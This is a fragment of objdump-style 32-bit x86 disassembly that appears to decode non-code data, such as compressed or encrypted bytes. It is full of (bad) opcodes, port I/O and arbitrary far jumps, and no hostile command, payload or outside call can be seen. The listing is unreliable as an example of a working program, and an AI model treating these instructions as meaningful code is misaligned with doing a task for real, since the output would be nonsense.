	...
  404cf2:	add    BYTE PTR [eax],al
  404cf4:	pop    ds
  404cf5:	cmp    DWORD PTR [esi+0x711dbe31],eax
  404cfb:	bound  edi,QWORD PTR [ebp+0x46]
  404cfe:	pop    eax
  404cff:	push   ebx
  404d00:	cmp    al,0xbb
  404d02:	cwde   
  404d03:	vsubsd xmm6,xmm0,QWORD PTR [ecx-0x39459d0c]
  404d0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d0c:	cdq    
  404d0d:	leave  
  404d0e:	mov    ebx,0x989e096
  404d13:	mov    esp,0x8d002ae4
  404d18:	mov    ch,0x4b
  404d1a:	rcr    ebp,cl
  404d1c:	jbe    0x404d3a
  404d1e:	out    dx,al
  404d1f:	out    dx,al
  404d20:	daa    
  404d21:	ins    DWORD PTR es:[edi],dx
  404d22:	sub    eax,0x1466e079
  404d27:	dec    eax
  404d28:	jns    0x404cb9
  404d2a:	aas    
  404d2b:	sbb    esi,DWORD PTR [edx]
  404d2d:	js     0x404d79
  404d2f:	sub    ch,bl
  404d31:	lock shl DWORD PTR [esi],0xac
  404d35:	mov    ds:0x36d07c6,al
  404d3a:	lods   al,BYTE PTR ds:[esi]
  404d3b:	push   esp
  404d3c:	cs add al,0x95
  404d3f:	gs out dx,eax
  404d41:	xchg   esp,eax
  404d42:	push   ebp
  404d43:	repz test al,0xfe
  404d46:	push   0xffffffc2
  404d48:	mov    cl,0x7
  404d4a:	mov    BYTE PTR [ecx-0x5f7f0016],dl
  404d50:	xor    esi,DWORD PTR [ebx]
  404d52:	(bad)  
  404d53:	scas   al,BYTE PTR es:[edi]
  404d54:	mov    ch,0xe4
  404d56:	rcr    DWORD PTR [edi+0x0],0x0
	...
  404d75:	add    BYTE PTR [ecx+eax*1-0x6b],ah
  404d79:	int3   
  404d7a:	daa    
  404d7b:	add    ch,BYTE PTR [ebp+edi*8+0x6b68ffd6]
  404d82:	out    0x63,al
  404d84:	adc    BYTE PTR [esi-0x19],0xa2
  404d88:	pop    ebx
  404d89:	adc    DWORD PTR [edx+eiz*8],0x20f58841
  404d90:	aad    0xff
  404d92:	out    dx,al
  404d93:	outs   dx,DWORD PTR ds:[esi]
  404d94:	mov    ah,0x8
  404d96:	add    BYTE PTR [edi-0x12371229],ch
  404d9c:	in     eax,0xd2
  404d9e:	mov    ds:0x2c14312c,eax
  404da3:	ins    BYTE PTR es:[edi],dx
  404da4:	cmp    BYTE PTR ds:0x4a53aadd,ch
  404daa:	mov    gs,ecx
  404dac:	dec    ecx
  404dad:	aas    
  404dae:	mov    edi,0xda9db228
  404db3:	xor    DWORD PTR [ebx-0x500f0c5e],ebx
  404db9:	iret   
  404dba:	cwde   
  404dbb:	mov    bl,0xc9
  404dbd:	mov    eax,0x79567291
  404dc2:	push   DWORD PTR ds:0xf4ee8e57
  404dc8:	jae    0x404e2d
  404dca:	cmp    eax,0x4c5c65b8
  404dcf:	ja     0x404dbb
  404dd1:	in     al,0x51
  404dd3:	cmp    ah,bl
  404dd5:	(bad)  [esi]
  404dd7:	stc    
  404dd8:	mov    bh,0xf6
	...
  404df6:	add    BYTE PTR [eax],al
  404df8:	jecxz  0x404db5
  404dfa:	rcl    DWORD PTR [ecx],0xb
  404dfd:	jnp    0x404dcd
  404dff:	push   eax
  404e00:	jne    0x404e3f
  404e02:	fbstp  TBYTE PTR [edi]
  404e04:	mov    ah,0xfc
  404e06:	mov    ebx,0x9dbf871a
  404e0b:	and    eax,0xdb687e46
  404e10:	dec    ecx
  404e11:	add    BYTE PTR [ecx-0x1c],ah
  404e14:	pop    esi
  404e15:	inc    ecx
  404e16:	add    BYTE PTR [edx-0x4],bh
  404e19:	pop    eax
  404e1a:	popf   
  404e1b:	and    DWORD PTR [ebx-0x76],0xffffffdc
  404e1f:	or     al,0x1a
  404e21:	add    BYTE PTR [ebx],bl
  404e23:	sbb    eax,0x3e59eedd
  404e28:	call   0x175fe74a
  404e2d:	dec    ebp
  404e2e:	fdiv   DWORD PTR [eax-0x66e8cf91]
  404e34:	mov    BYTE PTR [ecx],ah
  404e36:	push   esi
  404e37:	jb     0x404e9e
  404e39:	rcl    BYTE PTR [ebx+ecx*4+0x14d4034a],cl
  404e40:	jl     0x404eb7
  404e42:	adc    edx,DWORD PTR ds:0xf6525b83
  404e48:	addr16 test al,0x91
  404e4b:	out    0x6e,eax
  404e4d:	mov    ecx,0x931327d0
  404e52:	in     al,dx
  404e53:	es xor al,0xc2
  404e56:	lods   eax,DWORD PTR ds:[esi]
  404e57:	inc    ebp
  404e58:	push   ecx
  404e59:	jno    0x404ec9
  404e5b:	xor    al,0x0
	...
  404e79:	add    BYTE PTR [esi],bl
  404e7b:	pusha  
  404e7c:	das    
  404e7d:	jecxz  0x404e5b
  404e7f:	aad    0xe7
  404e81:	retf   0x719
  404e84:	test   eax,0x6a33aae1
  404e89:	clc    
  404e8a:	(bad)  [ebx+ebp*1]
  404e8d:	pop    edi
  404e8e:	sub    bl,BYTE PTR [ecx]
  404e90:	in     al,0x6e
  404e92:	sub    eax,0x184da548
  404e97:	sti    
  404e98:	gs sub al,0x87
  404e9b:	jmp    0x52e0:0x5cc65b26
  404ea2:	ror    DWORD PTR [ebp-0x4153d65f],0x62
  404ea9:	xor    BYTE PTR [ebx+0x500023af],dh
  404eaf:	aas    
  404eb0:	loope  0x404e6f
  404eb2:	jns    0x404eda
  404eb4:	sar    ah,1
  404eb6:	adc    cl,BYTE PTR [edx+0x146b3f83]
  404ebc:	mov    dl,0x7e
  404ebe:	je     0x404f13
  404ec0:	and    al,0xb9
  404ec2:	popf   
  404ec3:	retf   0xf815
  404ec6:	jbe    0x404f2d
  404ec8:	inc    esi
  404ec9:	cmp    edi,DWORD PTR [edi+0x60]
  404ecc:	ja     0x404f48
  404ece:	call   0xf1f5b9bb
  404ed3:	std    
  404ed4:	pop    ecx
  404ed5:	hlt    
  404ed6:	or     dl,bl
  404ed8:	or     BYTE PTR [edi],dh
  404eda:	and    ecx,DWORD PTR [ebx+0x38]
  404edd:	jbe    0x404edf
	...
  404efb:	add    BYTE PTR [esp+ecx*1-0x52],ch
  404eff:	mov    cl,0x95
  404f01:	nop
  404f02:	sahf   
  404f03:	lock outs dx,BYTE PTR ds:[esi]
  404f05:	mov    esi,0xa77733cb
  404f0a:	cld    
  404f0b:	jb     0x404ef1
  404f0d:	add    al,BYTE PTR [eax]
  404f0f:	add    ch,dh
  404f11:	shr    BYTE PTR [edx+0x37],0xf7
  404f15:	xchg   ah,dl
  404f17:	outs   dx,BYTE PTR ds:[esi]
  404f18:	out    0x44,al
  404f1a:	mov    esi,0xa80be359
  404f1f:	fdiv   QWORD PTR [edx-0x4f143d37]
  404f25:	outs   dx,DWORD PTR ds:[esi]
  404f26:	jl     0x404eda
  404f28:	mov    cl,0x4d
  404f2a:	push   ss
  404f2b:	test   DWORD PTR [edx-0x4447af6f],edi
  404f31:	push   ebx
  404f32:	cmp    ecx,DWORD PTR [edi-0x297aea57]
  404f38:	mov    eax,0x9de1eed7
  404f3d:	cwde   
  404f3e:	clc    
  404f3f:	fs jl  0x404f9c
  404f42:	xchg   ebx,eax
  404f43:	push   ebx
  404f44:	or     eax,0x72d7da3
  404f49:	mov    ds:0xa530473f,al
  404f4e:	in     eax,0xa2
  404f50:	fnstsw WORD PTR [ebx-0x4a353659]
  404f56:	popa   
  404f57:	ja     0x404f54
  404f59:	into   
  404f5a:	and    ebx,DWORD PTR ds:0xaef0224
	...
  404f7c:	add    BYTE PTR [eax],al
  404f7e:	jns    0x404f82
  404f80:	mov    cl,0x61
  404f82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f83:	nop
  404f84:	push   0xffffffdf
  404f86:	dec    edi
  404f87:	(bad)  
  404f88:	sub    al,0xb5
  404f8a:	cmp    BYTE PTR [edx-0x46aa0e28],bh
  404f90:	xchg   esi,eax
  404f91:	cwde   
  404f92:	and    dh,BYTE PTR [edi-0x478cd9ac]
  404f98:	adc    cl,BYTE PTR [esp+edi*2-0x65]
  404f9c:	fistp  WORD PTR [ecx+0x21]
  404f9f:	xchg   ebx,eax
  404fa0:	popf   
  404fa1:	xor    BYTE PTR [esi],ch
  404fa3:	popf   
  404fa4:	pop    ebx
  404fa5:	mov    ?,WORD PTR [edi-0x6a]
  404fa8:	sbb    esp,esp
  404faa:	inc    eax
  404fab:	dec    DWORD PTR [esi+0x46]
  404fae:	in     eax,dx
  404faf:	add    BYTE PTR [ebp-0x356d45d4],cl
  404fb5:	xchg   edx,eax
  404fb6:	mov    edx,DWORD PTR [ecx-0x596b07f8]
  404fbc:	inc    edi
  404fbd:	out    dx,al
  404fbe:	or     DWORD PTR [ebp-0x4ce97b7b],edi
  404fc4:	ret    
  404fc5:	cmp    bl,BYTE PTR [edi-0x34]
  404fc8:	add    DWORD PTR [eax+0x28],edx
  404fcb:	pop    ebp
  404fcc:	cmp    eax,0x7f564517
  404fd1:	jge    0x405005
  404fd3:	pop    esp
  404fd4:	mov    ecx,0xfb52e3c3
  404fd9:	test   al,0xc
  404fdb:	add    BYTE PTR [eax],bl
  404fdd:	xor    eax,0x771984ca
	...
  404ffe:	add    BYTE PTR [eax],al
  405000:	pop    eax
  405001:	push   ecx
  405002:	sbb    esi,DWORD PTR [ecx-0xce5561a]
  405008:	or     eax,0x70290dbb
  40500d:	jo     0x405013
  40500f:	imul   edx,DWORD PTR [edx+0x1cad0e65],0xffffff9e
  405016:	pop    es
  405017:	out    dx,eax
  405018:	mov    bh,0xc6
  40501a:	retf   0xd821
  40501d:	dec    ebx
  40501e:	retf   
  40501f:	arpl   dx,bp
  405021:	sbb    cl,cl
  405023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405024:	xchg   esp,eax
  405025:	loop   0x404fee
  405027:	out    0x3f,eax
  405029:	repz rcr BYTE PTR [ebx],cl
  40502c:	popa   
  40502d:	call   0xfd83aa03
  405032:	mov    edi,0xc145ad9f
  405037:	fld    QWORD PTR [edi+ecx*1]
  40503a:	adc    al,0x13
  40503c:	sub    DWORD PTR [ebp+ecx*1+0x7c17b51],edx
  405043:	xchg   edi,eax
  405044:	lds    edi,FWORD PTR [ecx-0x2]
  405047:	aam    0xac
  405049:	push   0x39
  40504b:	jp     0x404fe5
  40504d:	mov    edi,0x94ea3c38
  405052:	cmp    bh,dh
  405054:	xor    eax,0x1ec03b6e
  405059:	ja     0x405079
  40505b:	jno    0x40504d
  40505d:	sti    
  40505e:	push   ss
  40505f:	xor    edx,DWORD PTR [edx-0x17]
  405062:	sbb    al,0xf5
	...
  405080:	add    BYTE PTR [eax],al
  405082:	mov    ebp,0x96b71411
  405087:	inc    edx
  405088:	pop    es
  405089:	mov    ecx,ecx
  40508b:	pop    ss
  40508c:	dec    BYTE PTR [eax+0x5b]
  40508f:	dec    esp
  405090:	add    ah,dh
  405092:	or     ecx,DWORD PTR [eax]
  405094:	push   ss
  405095:	in     eax,dx
  405096:	shl    DWORD PTR [ecx],0x21
  405099:	loopne 0x405029
  40509b:	adc    esp,DWORD PTR [ecx+eiz*8-0x2c6d0234]
  4050a2:	adc    ah,BYTE PTR [eax-0x36]
  4050a5:	ror    BYTE PTR [eax-0x37],cl
  4050a8:	std    
  4050a9:	aad    0xca
  4050ab:	in     eax,dx
  4050ac:	scas   eax,DWORD PTR es:[edi]
  4050ad:	int3   
  4050ae:	add    BYTE PTR [edi+eax*4-0x3a],al
  4050b2:	ss xchg esi,eax
  4050b4:	fidivr WORD PTR [edi-0x6d16908c]
  4050ba:	jecxz  0x405041
  4050bc:	ins    BYTE PTR es:[edi],dx
  4050bd:	xchg   ebx,eax
  4050be:	sbb    DWORD PTR [ebx+ebx*2+0x22e5f81],ebp
  4050c5:	sbb    BYTE PTR [ebp-0x4674cb29],0x1c
  4050cc:	or     BYTE PTR [edx-0x77c10d0d],cl
  4050d2:	and    eax,0x67896669
  4050d7:	mov    esi,0xb36f4c51
  4050dc:	aam    0x45
  4050de:	sub    eax,0xf34fe35d
  4050e3:	(bad)  
  4050e4:	mov    ecx,0x46
	...
  405101:	add    BYTE PTR [eax],al
  405103:	add    BYTE PTR [ecx-0x61ce72d7],ch
  405109:	(bad)  
  40510a:	and    BYTE PTR [eax],dh
  40510c:	fsub   QWORD PTR [eax+0x17]
  40510f:	and    ah,BYTE PTR [edx]
  405111:	sti    
  405112:	dec    ebp
  405113:	and    ebx,DWORD PTR [eax+0x15]
  405116:	jns    0x40514e
  405118:	xchg   DWORD PTR [edi],ebx
  40511a:	cld    
  40511b:	das    
  40511c:	lds    ecx,FWORD PTR [eax]
  40511e:	retf   
  40511f:	and    eax,0x1c9252fb
  405124:	xor    DWORD PTR [ebp-0x4005ff5b],edi
  40512a:	call   0xe9af:0xeffdeb98
  405131:	inc    ebx
  405132:	dec    esi
  405133:	imul   al
  405135:	and    DWORD PTR [ecx+eax*8],0x4432c8b5
  40513c:	mov    ah,0x6
  40513e:	pop    eax
  40513f:	jae    0x4050e7
  405141:	dec    esp
  405142:	out    0x2a,al
  405144:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405145:	mov    cl,BYTE PTR [ebp+ebx*1+0x50687488]
  40514c:	jns    0x405100
  40514e:	add    DWORD PTR [edi+0x7b],esp
  405151:	lock mov ebx,0xd62e7a3e
  405157:	or     DWORD PTR [edi-0x79733f89],eax
  40515d:	mov    ebp,0xf374bba9
  405162:	adc    esp,edx
  405164:	jne    0x40519f
  405166:	jle    0x40513d
	...
  405184:	add    BYTE PTR [eax],al
  405186:	outs   dx,BYTE PTR ds:[esi]
  405187:	gs cmp eax,ebp
  40518a:	outs   dx,DWORD PTR ds:[esi]
  40518b:	lahf   
  40518c:	push   edx
  40518d:	fistp  QWORD PTR [ebp-0x1f]
  405190:	in     al,dx
  405191:	xchg   BYTE PTR [ebx+edi*1-0x79],bh
  405195:	mov    cl,0x51
  405197:	imul   edx,DWORD PTR [ecx-0x552bfcc],0x3
  40519e:	inc    edx
  40519f:	out    0x44,eax
  4051a1:	pop    edx
  4051a2:	and    ebp,DWORD PTR [ecx]
  4051a4:	das    
  4051a5:	ins    DWORD PTR es:[edi],dx
  4051a6:	aad    0xaf
  4051a8:	sbb    al,BYTE PTR [eax-0x488e922c]
  4051ae:	(bad)  
  4051af:	xor    ecx,edi
  4051b1:	out    dx,al
  4051b2:	(bad)  
  4051b3:	icebp  
  4051b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051b5:	fstp   DWORD PTR [edx-0x74a34d4e]
  4051bb:	js     0x405196
  4051bd:	imul   ecx,DWORD PTR ds:0xff675b8c,0xffffff84
  4051c4:	sbb    eax,0xe172100d
  4051c9:	dec    ecx
  4051ca:	in     eax,0x8a
  4051cc:	lahf   
  4051cd:	and    BYTE PTR [edx],cl
  4051cf:	test   DWORD PTR [ebp-0x62],esp
  4051d2:	cmp    ebx,DWORD PTR [ebx+eiz*1]
  4051d5:	hlt    
  4051d6:	in     al,dx
  4051d7:	xor    dl,ch
  4051d9:	loope  0x405244
  4051db:	das    
  4051dc:	test   al,0x88
  4051de:	pop    esi
  4051df:	cmp    eax,0x3e87366e
  4051e4:	sub    al,0x5c
  4051e6:	test   al,0x43
  4051e8:	div    BYTE PTR [edi+0x0]
	...
  405206:	add    BYTE PTR [eax],al
  405208:	pop    ebp
  405209:	fdiv   QWORD PTR [ebx+0x71d252d2]
  40520f:	ins    BYTE PTR es:[edi],dx
  405210:	jae    0x4051fb
  405212:	das    
  405213:	push   es
  405214:	je     0x4051f4
  405216:	cld    
  405217:	psllw  mm3,mm5
  40521a:	mov    edx,0x78f0167a
  40521f:	(bad)  
  405220:	iret   
  405221:	lock ss scas al,BYTE PTR es:[edi]
  405224:	mov    al,ds:0xd5e90295
  405229:	xchg   esi,eax
  40522a:	les    eax,FWORD PTR [ebx+0x3d7e989a]
  405230:	jmp    0x4051c9
  405232:	inc    eax
  405233:	push   edi
  405234:	sbb    al,0xbb
  405236:	or     eax,DWORD PTR [ecx-0x67]
  405239:	mov    ah,0xcd
  40523b:	sub    ebp,DWORD PTR [esi-0x86a7846]
  405241:	mov    cl,0x49
  405243:	(bad)  
  405244:	fsub   DWORD PTR [eax+0x1c]
  405247:	pop    ebp
  405248:	ins    DWORD PTR es:[edi],dx
  405249:	pop    edi
  40524a:	pop    esi
  40524b:	aaa    
  40524c:	inc    edx
  40524d:	ins    DWORD PTR es:[edi],dx
  40524e:	cwde   
  40524f:	mov    DWORD PTR [ebx],eax
  405251:	outs   dx,BYTE PTR ds:[esi]
  405252:	(bad)  
  405254:	add    al,0x0
  405256:	(bad)  
  405257:	adc    edi,DWORD PTR [eax-0x65aa41a4]
  40525d:	test   DWORD PTR [edi+ecx*4-0x2e525214],esi
  405264:	push   edi
  405265:	mov    ds:0xb8112d9e,eax
  40526a:	xchg   edi,eax
  40526b:	imul   eax,DWORD PTR [eax],0x0
	...
  40528a:	xor    ebp,DWORD PTR [ecx+0x52b5a99d]
  405290:	xchg   esp,eax
  405291:	out    0xbc,eax
  405293:	jg     0x4052ce
  405295:	es test eax,0x4b643804
  40529b:	int    0x39
  40529d:	mov    ds:0xe03b25fd,al
  4052a2:	add    al,0x3b
  4052a4:	sub    al,0x3a
  4052a6:	arpl   ax,si
  4052a8:	and    al,0x78
  4052aa:	and    ecx,0x1a27be2e
  4052b0:	es cld 
  4052b2:	or     al,BYTE PTR [edi+0x2b]
  4052b5:	xor    ebx,ebx
  4052b7:	retf   
  4052b8:	sub    ch,BYTE PTR [edi-0x7]
  4052bb:	xchg   esp,eax
  4052bc:	sub    BYTE PTR [ebp-0xcd6a171],dh
  4052c2:	xor    dh,BYTE PTR [ebx+0x32]
  4052c5:	inc    edi
  4052c6:	jb     0x405330
  4052c8:	xor    ecx,DWORD PTR [ecx-0x34de86b0]
  4052ce:	xchg   esi,eax
  4052cf:	shl    DWORD PTR [eax],0xd
  4052d2:	sbb    al,0x8f
  4052d4:	mov    ch,0x3f
  4052d6:	or     dl,BYTE PTR [esp+ebp*4]
  4052d9:	sub    DWORD PTR [eax+0x3d],0xf5dec3a6
  4052e0:	sahf   
  4052e1:	add    eax,0x6857eaa4
  4052e6:	jnp    0x405327
  4052e8:	pop    ecx
  4052e9:	fst    DWORD PTR es:[eax]
  4052ec:	add    BYTE PTR [ebx+0x0],bl
	...
  40530b:	add    cl,ah
  40530d:	ds cs pop edx
  405310:	ja     0x4052f9
  405312:	sbb    BYTE PTR [edi+0x2c],bh
  405315:	ficomp DWORD PTR [ebx-0x54cbe58a]
  40531b:	jl     0x4052c5
  40531d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40531e:	bnd jne 0x40538f
  405321:	jg     0x4052e8
  405323:	data16 cmp al,cl
  405326:	clc    
  405327:	pop    edi
  405328:	hlt    
  405329:	push   0xffffffcf
  40532b:	push   ebp
  40532c:	mov    dh,0xed
  40532e:	xchg   ebp,eax
  40532f:	dec    esp
  405330:	test   al,0x16
  405332:	mov    eax,ds:0x2428d381
  405337:	sbb    BYTE PTR ds:0x5f721303,0x55
  40533e:	dec    edx
  40533f:	jae    0x4052c2
  405341:	scas   al,BYTE PTR es:[edi]
  405342:	jge    0x4053b8
  405344:	xchg   edi,eax
  405345:	shr    BYTE PTR [edi],cl
  405347:	ins    DWORD PTR es:[edi],dx
  405348:	leave  
  405349:	cmp    BYTE PTR [edi],al
  40534b:	or     ebx,DWORD PTR [bx+0x5e5e]
  405350:	push   ebp
  405351:	test   BYTE PTR [ecx+0x73],ch
  405354:	mov    ?,WORD PTR [edx-0x14]
  405357:	jb     0x405329
  405359:	nop
  40535a:	(bad)  [eax+0x32]
  40535d:	inc    edi
  40535e:	and    BYTE PTR [ecx+0x4c],0xdc
  405362:	mov    ah,0x6a
  405364:	mov    al,ds:0xd66b8823
  405369:	or     DWORD PTR [edi-0x1997eb97],edi
  40536f:	push   0x0
	...
  40538c:	add    BYTE PTR [eax],al
  40538e:	ret    0xd1ba
  405391:	ins    DWORD PTR es:[edi],dx
  405392:	jle    0x405358
  405394:	push   esp
  405395:	fs inc eax
  405397:	pop    esi
  405398:	arpl   WORD PTR [esi-0x1e],bp
  40539b:	out    dx,eax
  40539c:	cmp    DWORD PTR [edi-0x64],esp
  40539f:	adc    cl,BYTE PTR ds:0xd0627d00
  4053a5:	mov    al,ds:0x97b99c7c
  4053aa:	mov    ?,esi
  4053ac:	add    ecx,esi
  4053ae:	(bad)  
  4053af:	and    BYTE PTR [esi-0x7],ch
  4053b2:	pop    edx
  4053b3:	imul   edi,DWORD PTR [eax+0x7c],0x4b
  4053b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053b8:	adc    DWORD PTR [ebx+0x49],ecx
  4053bb:	fild   QWORD PTR [ebx-0x39d717ee]
  4053c1:	and    eax,0x18816d53
  4053c6:	push   edx
  4053c7:	mov    bl,0xea
  4053c9:	das    
  4053ca:	inc    eax
  4053cb:	icebp  
  4053cc:	push   esp
  4053cd:	jbe    0x4053a0
  4053cf:	inc    esi
  4053d0:	aas    
  4053d1:	inc    ecx
  4053d2:	xchg   esp,eax
  4053d3:	je     0x4053fe
  4053d5:	les    eax,FWORD PTR [ebp-0x780cbd46]
  4053db:	clc    
  4053dc:	cld    
  4053dd:	stos   BYTE PTR es:[edi],al
  4053de:	xchg   esi,eax
  4053df:	cs xchg edi,eax
  4053e1:	popf   
  4053e2:	loope  0x4053a3
  4053e4:	jae    0x4053b6
  4053e6:	loopne 0x40537d
  4053e8:	sbb    bh,ah
  4053ea:	sar    BYTE PTR [ebx],cl
  4053ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053ed:	mov    esi,0x89cd81c3
	...
  40540e:	add    BYTE PTR [eax],al
  405410:	out    0xc8,al
  405412:	fisttp DWORD PTR [edi+edx*8]
  405415:	(bad)  
  405416:	mov    al,0x3b
  405418:	aad    0x44
  40541a:	punpckldq mm0,mm4
  40541d:	mov    ah,BYTE PTR [ebp+0x55]
  405420:	iret   
  405421:	data16 and ch,BYTE PTR [eax-0x32]
  405425:	nop
  405426:	inc    edi
  405427:	pop    edi
  405428:	(bad)  
  40542a:	cmc    
  40542b:	push   es
  40542c:	cmp    eax,0xa8319c0d
  405431:	dec    esp
  405432:	mov    dh,BYTE PTR [ecx+ebx*4+0xd83df8e]
  405439:	outs   dx,BYTE PTR ds:[esi]
  40543a:	cmp    DWORD PTR [esi-0x39],ebx
  40543d:	xchg   BYTE PTR [ebx+0x34],bh
  405440:	lock test al,0x3
  405443:	add    BYTE PTR ds:0x68675781,cl
  405449:	or     DWORD PTR [eax+ecx*8],0xffffff96
  40544d:	mov    edx,0xdb3af50
  405452:	and    DWORD PTR [edi-0xf4a519e],edx
  405458:	inc    ebx
  40545a:	sub    bl,BYTE PTR [edi-0x37]
  40545d:	and    ebp,DWORD PTR [esi+0x4f636438]
  405463:	sub    BYTE PTR [edx-0x78b0f46d],ch
  405469:	std    
  40546a:	pop    eax
  40546b:	loopne 0x40545e
  40546d:	ins    DWORD PTR es:[edi],dx
  40546e:	add    al,0x87
  405470:	or     al,0x53
  405472:	lods   eax,DWORD PTR ds:[esi]
  405473:	mov    edi,0x0
	...
  405490:	add    BYTE PTR [eax],al
  405492:	mov    ch,0x3a
  405494:	sub    eax,ebx
  405496:	push   eax
  405497:	dec    eax
  405498:	mov    dh,0x77
  40549a:	push   ds
  40549b:	push   ecx
  40549c:	and    dl,BYTE PTR [eax]
  40549e:	mov    ebx,0x7a56fc78
  4054a3:	xor    BYTE PTR [eax+0x30],ah
  4054a6:	push   edi
  4054a7:	shl    dl,cl
  4054a9:	sahf   
  4054aa:	and    DWORD PTR [ebx+0x67],ebp
  4054ad:	clc    
  4054ae:	mov    esp,0x45c01a3d
  4054b3:	jge    0x405473
  4054b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054b6:	pusha  
  4054b7:	jae    0x4054ca
  4054b9:	or     dh,cl
  4054bb:	repz les ebp,FWORD PTR [edi-0x15]
  4054bf:	xor    ebp,DWORD PTR [eax+0x7f]
  4054c2:	popf   
  4054c3:	ret    
  4054c4:	hlt    
  4054c5:	pop    ss
  4054c6:	clc    
  4054c7:	dec    ebp
  4054c8:	pop    edi
  4054c9:	mov    bh,0x6
  4054cb:	pop    ds
  4054cc:	sti    
  4054cd:	iret   
  4054ce:	mov    ds:0xe5c50300,eax
  4054d3:	fisttp QWORD PTR [edx-0x66bd7def]
  4054d9:	mov    esi,0x19e1642d
  4054de:	dec    edx
  4054df:	(bad)  
  4054e0:	mov    edx,edx
  4054e2:	stos   DWORD PTR es:[edi],eax
  4054e3:	(bad)  
  4054e4:	loopne 0x40546b
  4054e6:	lds    edi,FWORD PTR [ecx]
  4054e8:	jecxz  0x4054c2
  4054ea:	xor    ecx,DWORD PTR [ebx+0x7b]
  4054ed:	jge    0x4054fc
  4054ef:	mov    al,0xd6
  4054f1:	xor    esi,ebp
  4054f3:	es jbe 0x40549e
	...
  405512:	add    BYTE PTR [eax],al
  405514:	push   edx
  405515:	add    al,0x6c
  405517:	cmp    ebx,DWORD PTR [ebp+0x7a9ecca2]
  40551d:	jge    0x40552b
  40551f:	jle    0x4054b3
  405521:	scas   eax,DWORD PTR es:[edi]
  405522:	pushf  
  405523:	fidiv  DWORD PTR [edx-0x257a59b4]
  405529:	cmp    esi,esi
  40552b:	shr    BYTE PTR [edx],1
  40552d:	aad    0x52
  40552f:	mov    al,ds:0x3bbb7e1d
  405534:	cli    
  405535:	mov    al,ds:0x345a6a9
  40553a:	push   ecx
  40553b:	xor    esp,DWORD PTR [edx+0x62e93928]
  405541:	pop    edi
  405542:	mov    cl,0x6c
  405544:	jb     0x405502
  405546:	xchg   ebx,eax
  405547:	loope  0x405543
  405549:	jmp    0x451acb98
  40554e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40554f:	dec    edx
  405550:	stos   BYTE PTR es:[edi],al
  405551:	lea    esp,[esi]
  405553:	pop    DWORD PTR ds:0x72443c71
  405559:	adc    edi,DWORD PTR [edi+edx*4+0x4d]
  40555d:	clc    
  40555e:	mov    ebx,0x6c463d74
  405563:	loope  0x4055c0
  405565:	jmp    0xf8bbab69
  40556a:	(bad)  
  40556b:	(bad)  
  40556c:	hlt    
  40556d:	adc    eax,0x3ca3a3a0
  405572:	sbb    ebx,ebp
  405574:	dec    edi
  405575:	loopne 0x4055f2
  405577:	stc    
	...
  405594:	add    BYTE PTR [eax],al
  405596:	call   0xf7a8:0x56819284
  40559d:	(bad)  
  40559e:	jmp    0x57d5:0x610a3d2c
  4055a5:	clc    
  4055a6:	ret    
  4055a7:	test   BYTE PTR [esi-0x2c72d0a0],dh
  4055ad:	std    
  4055ae:	or     ch,al
  4055b0:	push   0x4d
  4055b2:	les    esp,FWORD PTR [edi+0xf]
  4055b5:	push   edi
  4055b6:	add    ebp,edi
  4055b8:	loopne 0x4055a1
  4055ba:	int    0x1f
  4055bc:	test   BYTE PTR [edi],ah
  4055be:	xor    DWORD PTR [eax],edx
  4055c0:	rol    BYTE PTR [edi+0x7db6ed9a],cl
  4055c6:	not    DWORD PTR [edi+0x59]
  4055c9:	sbb    eax,0x383cb572
  4055ce:	dec    esp
  4055cf:	pushf  
  4055d0:	test   eax,edx
  4055d2:	sbb    BYTE PTR [eax-0x1baa2d20],al
  4055d8:	or     eax,0x6b48112a
  4055dd:	xor    dl,BYTE PTR [ebx]
  4055df:	add    eax,0x27bfbaa2
  4055e4:	(bad)  
  4055e5:	enter  0xbd4a,0x29
  4055e9:	adc    dh,ah
  4055eb:	pop    edi
  4055ec:	dec    esp
  4055ed:	lods   eax,DWORD PTR ds:[esi]
  4055ee:	icebp  
  4055ef:	ja     0x4055e6
  4055f1:	sbb    eax,0x790947d
  4055f6:	or     BYTE PTR [eax],dh
  4055f8:	jle    0x4055b1
	...
  405616:	add    BYTE PTR [eax],al
  405618:	fs int3 
  40561a:	sbb    al,BYTE PTR [eax]
  40561c:	and    bh,BYTE PTR [ecx]
  40561e:	daa    
  40561f:	dec    ebp
  405620:	ficom  DWORD PTR [ebp+0x2f58283f]
  405626:	out    dx,eax
  405627:	(bad)  
  405628:	sar    bl,1
  40562a:	xchg   DWORD PTR [ebx+0x1ab06365],esp
  405630:	sub    eax,0xf7fd6e7
  405635:	dec    edx
  405636:	js     0x4055c9
  405638:	ficomp WORD PTR ds:0xff4
  40563d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40563e:	test   BYTE PTR [ebx],0x67
  405641:	and    dl,BYTE PTR [eax+0x3e9f6566]
  405647:	mov    BYTE PTR ds:0x58ed580b,cl
  40564d:	dec    eax
  40564e:	pusha  
  40564f:	push   esp
  405650:	mov    al,ds:0xa2310787
  405655:	inc    eax
  405656:	test   al,0xdf
  405658:	dec    edx
  405659:	ins    DWORD PTR es:[edi],dx
  40565a:	iret   
  40565b:	mov    edx,0xecdf0a92
  405660:	jmp    0x1723:0x2889b79d
  405667:	add    BYTE PTR [bx+0x26f],ah
  40566c:	push   ebp
  40566d:	outs   dx,DWORD PTR ds:[esi]
  40566e:	dec    eax
  40566f:	mov    ebx,0xde2f403d
  405674:	pop    ds
  405675:	test   DWORD PTR [eax-0x18b7a8d0],eax
  40567b:	push   ebp
	...
  405698:	add    BYTE PTR [eax],al
  40569a:	aas    
  40569b:	scas   al,BYTE PTR es:[edi]
  40569c:	lahf   
  40569d:	pushf  
  40569e:	idiv   DWORD PTR [edx-0x39]
  4056a1:	stc    
  4056a2:	cmc    
  4056a3:	mov    ch,0x67
  4056a5:	pop    ss
  4056a6:	jge    0x4056bd
  4056a8:	(bad)  
  4056aa:	or     cl,dl
  4056ac:	ss retf 
